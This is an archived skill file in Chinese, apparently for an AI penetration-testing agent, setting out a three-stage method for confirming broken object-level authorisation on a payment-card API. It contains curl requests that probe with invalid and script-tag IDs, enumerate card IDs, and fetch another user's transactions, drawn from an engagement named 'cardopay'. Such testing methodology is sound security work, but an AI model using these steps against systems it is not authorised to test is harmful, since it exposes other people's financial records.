<!-- archived from /root/.hermes/skills/security/bola-confirmation-methodology/SKILL.md on 2026-10-21 -->

---
name: bola-confirmation-methodology
description: >-
  BOLA（越权对象访问）三阶段确认方法论：架构级 BOLA 识别 → 卡点分析 → 
  完整利用。区分「没数据」和「被拒绝」，避免空列表误判为安全。
  用户提到 BOLA、IDOR 确认、越权验证方法、空列表是否安全时使用。
  来源：cardopay_20260802 实战提炼。
version: 1.0.0
---

> 归档卡：原目录 `/root/.hermes/skills/security/bola-confirmation-methodology`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/bola-confirmation-methodology/…')`，不要相对 `references/legacy/` 解析。

# BOLA 三阶段确认方法论

**前提**：目标在 `config/scope*.json`。
**来源**：案卷 `cardopay_20260802` 实战验证。

---

## 核心原则：空列表 ≠ 安全

```
{code:0, data:[]}  可能是：
  ① 有权限检查，你没权限         → 安全 ✅
  ② 没有权限检查，只是没数据       → BOLA ❌
  ③ SQL 模板有未绑定变量          → 需要传参 ❌
```

## 第一阶段：架构级 BOLA 识别

用**明显非法的输入**测试后端是否做了 owner 检查：

```bash
# 传一个不存在的 card_id
curl -X POST https://目标/api/v2/card/trades \
  -H "Authorization: Bearer <自己的token>" \
  -d '{"card_id":"abc123","page_no":1,"page_size":10}'

# 结果分析：
# → 200 {code:0, trades:[]}     → ⚠️ 没检查 owner（SQL: WHERE card_id=?）
# → 403 "无权限"               → ✅ 有检查
# → 404 "card not found"       → ✅ 先查了归属

# 加码：传 XSS payload
curl -X POST https://目标/api/v2/card/trades \
  -d '{"card_id":"<script>"}'
# → 200 {code:0}               → 确认：后端只做 WHERE card_id=?，无 AND user_id=?
```

**判断标准**：
| 响应 | 含义 | 结论 |
|------|------|------|
| `200 + code:0 + 空数据` | 查了但没数据 | ⚠️ 可能 BOLA |
| `200 + code:0 + 有数据` | 读到他人数据 | ❌ 确认 BOLA |
| `403` / `401` | 权限拒绝 | ✅ 安全 |
| `404 "not found"` | 先查了归属 | ✅ 安全 |
| `500 "record not found"` | 查了没有，但不是权限错 | ⚠️ 可能 BOLA |

## 第二阶段：卡点分析

架构 BOLA 确认后，找到真实 ID 才能完整利用：

| ID 类型 | 获取方式 |
|---------|----------|
| 顺序整数 | 遍历 1-10000 |
| UUID | 从其他泄露接口/日志/邮件/群聊获取 |
| 自定义字符串 | Swagger examples / 开发文档 / 客服群截图 |
| 哈希 | 几乎不可能猜测，需要其他泄露源 |

**cardopay 教训**：card_id 是自定义字符串格式，1-500 整数遍历全不中。需要真实 card_id。

## 第三阶段：完整利用

拿到真实 ID 后验证：
```bash
# A 用户的 token + B 用户的 card_id
curl -X POST https://目标/api/v2/card/trades \
  -H "Authorization: Bearer <A的token>" \
  -d '{"card_id":"<B的真实card_id>"}'
# → 200 {code:0, trades:[...B的交易记录...]}  → 完整 BOLA 确认
```

## 常见 BOLA 模式

| 模式 | SQL | 安全？ |
|------|-----|--------|
| `WHERE card_id=?` | 只查 card_id | ❌ BOLA |
| `WHERE card_id=? AND user_id=?` | 绑定用户 | ✅ |
| `WHERE card_id=? AND user_id=(SELECT ...)` | 子查询 | ✅ |
| `WHERE card_id=?` + 代码层 `if owner != user` | 应用层检查 | ✅ |

## 踩坑

- `record not found` 不是「安全」——是没查到但没检查权限
- Swagger 标记 `required: card_id` 但不标 `user_id` → 后端可能也没检查
- 空列表场景：先用自己的真实 ID 确认能返回数据，再换他人 ID 对比
- LEMFT 等第三方服务宕机时，BOLA 存在但暂时不可利用（等恢复）
